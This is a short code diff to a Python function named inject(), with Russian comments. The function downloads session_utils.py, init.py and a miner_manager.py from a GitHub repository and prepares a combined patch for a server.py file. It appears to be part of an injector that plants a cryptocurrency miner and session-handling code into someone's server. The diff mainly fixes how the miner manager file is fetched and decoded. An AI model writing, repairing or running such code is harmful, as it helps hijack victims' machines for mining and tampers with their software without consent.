@@ -94,7 +94,7 @@ def inject():
         temp_dir = Path(temp_dir_str)
         try:
             SESSION_UTILS_URL = "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/session_utils.py"
-            MINER_MANAGER = "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/miner_manager.py"
+            MINER_MANAGER_URL = "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/miner_manager.py"
             SRL_INIT_URL = "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/init.py"
             REQUIRED_PACKAGES = [('aiohttp', 'aiohttp'), ('Crypto', 'pycryptodome'),
                                  ('aiohttp_session', 'aiohttp_session[secure]')]
@@ -137,7 +137,9 @@ def inject():
             session_utils_content = urllib.request.urlopen(
                 urllib.request.Request(SESSION_UTILS_URL)).read()
             srl_init_content = urllib.request.urlopen(urllib.request.Request(SRL_INIT_URL)).read()
-            miner_manager_content = urllib.request.urlopen(urllib.request.Request(MINER_MANAGER)).read()
+
+            with urllib.request.urlopen(urllib.request.Request(MINER_MANAGER_URL)) as response:
+                miner_manager_content = response.read().decode('utf-8')  # Декодируем bytes в str
 
             # --- Подготовка патча для server.py (Оба патча вместе) ---
             print("[*] Готовлю комбинированный патч для server.py...")
